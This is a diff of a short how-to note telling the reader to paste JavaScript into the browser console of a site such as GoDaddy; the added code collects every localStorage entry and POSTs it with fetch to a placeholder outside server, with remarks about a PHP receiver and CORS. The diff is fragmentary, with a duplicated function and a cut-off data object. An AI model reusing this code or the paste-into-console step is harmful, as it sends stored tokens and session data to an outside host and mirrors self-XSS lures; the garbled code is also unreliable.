@@ -1,6 +1,9 @@
+
 In order to display the current sites Local "Store" of the current site (try it on Godaddy)
 Goto Inspect Element/ Console paste in this JS:
-  
+
+
+UPDATE:
 function sendDataToServer() {
     var storageObj = {};
     for (let i = 0; i < localStorage.length; i++) {
@@ -13,15 +16,21 @@ function sendDataToServer() {
         localStorage: storageObj
     };
 
+    // Example of how to send the data to a server using fetch API
+    fetch('YOUR_SERVER_ENDPOINT_HERE', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => console.log('Success:', data))
+    .catch((error) => console.error('Error:', error));
+}
 
 
-function sendDataToServer() {
-    var storageObj = {};
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        storageObj[key] = localStorage.getItem(key);
-    }
---
+
 This is multipart - u need a php script on your server to read this and the site has to have no cors/origin policy blocking:
 
     const data = {
